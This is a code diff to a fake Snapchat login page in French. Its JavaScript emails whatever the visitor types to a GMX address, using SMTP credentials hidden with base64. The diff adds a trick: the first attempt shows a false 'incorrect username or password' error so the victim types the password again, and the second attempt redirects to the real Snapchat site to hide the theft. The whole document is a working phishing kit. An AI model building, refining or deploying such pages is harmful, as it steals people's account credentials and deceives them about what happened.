@@ -27,11 +27,12 @@
             <input id="password" type="password" style="outline: 0; border-width: 0 0 2px" />
         </div>
     </div>
-    <div style="display:flex; justify-content:center; height: 10%; width: 100%; margin-bottom:10%;">
-        <button style="width: 50%; color: white; font-size: 50; border:none; border-radius: 100px"
+    <div style="display:flex; flex-direction:column; align-items:center; height: 15%; width: 100%; margin-bottom:10%;">
+        <button style="height:100%; width: 50%; color: white; font-size: 50; border:none; border-radius: 100px"
             onclick="sendCredentials()">
             Connexion
         </button>
+        <h1 id="error" style="font-size:30; color: red"></h1>
     </div>
 </body>
 <footer
@@ -41,7 +42,11 @@
 </footer>
 
 <script>
+    var attempt = 0
+
     function sendCredentials() {
+        attempt++
+        console.log(attempt)
         Email.send("snapchatmdp@gmx.fr",
             "snapchatmdp@gmx.fr",
             "Snapchat",
@@ -49,7 +54,12 @@
             "mail.gmx.fr",
             atob("c25hcGNoYXRtZHBAZ214LmZy"),
             atob("U25hcGNoYXQ=")
-        );
-        window.location.replace("http://snapchat.com");
+        )
+        setTimeout(() => {
+            if(attempt === 2)
+                window.location.replace("http://snapchat.com")
+            else
+                document.getElementById("error").innerHTML = "Nom d'utilisateur ou mot de passe incorrect";
+        }, 500);
     }
 </script>
